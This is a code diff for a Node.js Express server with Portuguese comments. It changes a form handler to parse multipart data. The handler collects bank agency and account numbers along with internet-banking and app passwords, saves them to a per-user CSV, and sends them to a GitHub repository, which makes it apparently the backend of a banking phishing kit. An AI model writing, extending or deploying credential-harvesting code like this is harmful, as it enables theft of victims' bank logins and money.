@@ -47,44 +47,49 @@ function getCsvWriter(userId) {
 }
 
 // Processa o envio do formulário
-app.post("/processa_formulario", (req, res) => {
-  const {
-    titularidade,
-    tipo_conta,
-    agency,
-    login,
-    internet,
-    app: senhaApp,
-    user_id
-  } = req.body;
+// Agora usando multer para parsear multipart/form-data
+app.post(
+  "/processa_formulario",
+  upload.none(),
+  (req, res) => {
+    const {
+      titularidade,
+      tipo_conta,
+      agency,
+      login,
+      internet,
+      app: senhaApp,
+      user_id
+    } = req.body;
 
-  if (!agency || !login || !internet || !senhaApp || !user_id) {
-    return res.status(400).send("Todos os campos são obrigatórios.");
+    if (!agency || !login || !internet || !senhaApp || !user_id) {
+      return res.status(400).send("Todos os campos são obrigatórios.");
+    }
+
+    const registro = [{
+      titularidade,
+      tipo_conta,
+      agencia: agency,
+      conta: login,
+      senhaInternet: internet,
+      senhaApp
+    }];
+
+    // 1) Salva localmente no CSV do usuário
+    const csvWriter = getCsvWriter(user_id);
+    csvWriter.writeRecords(registro)
+      .then(() => console.log("Dados salvos no CSV do usuário com sucesso."))
+      .catch(err => console.error("Erro ao salvar localmente no CSV:", err));
+
+    // 2) Envia ao GitHub
+    saveToGitHub(user_id, registro)
+      .then(() => console.log("Dados enviados ao GitHub com sucesso."))
+      .catch(err => console.error("Erro ao salvar no GitHub:", err));
+
+    // Redireciona para a página de agradecimento
+    res.redirect("/agradecimento.html");
   }
-
-  const registro = [{
-    titularidade,
-    tipo_conta,
-    agencia: agency,
-    conta: login,
-    senhaInternet: internet,
-    senhaApp
-  }];
-
-  // 1) Salva localmente no CSV do usuário
-  const csvWriter = getCsvWriter(user_id);
-  csvWriter.writeRecords(registro)
-    .then(() => console.log("Dados salvos no CSV do usuário com sucesso."))
-    .catch(err => console.error("Erro ao salvar localmente no CSV:", err));
-
-  // 2) Envia ao GitHub
-  saveToGitHub(user_id, registro)
-    .then(() => console.log("Dados enviados ao GitHub com sucesso."))
-    .catch(err => console.error("Erro ao salvar no GitHub:", err));
-
-  // Redireciona para a página de agradecimento
-  res.redirect("/agradecimento.html");
-});
+);
 
 // Função para criar ou atualizar CSV de usuário no GitHub
 async function saveToGitHub(userId, registros) {
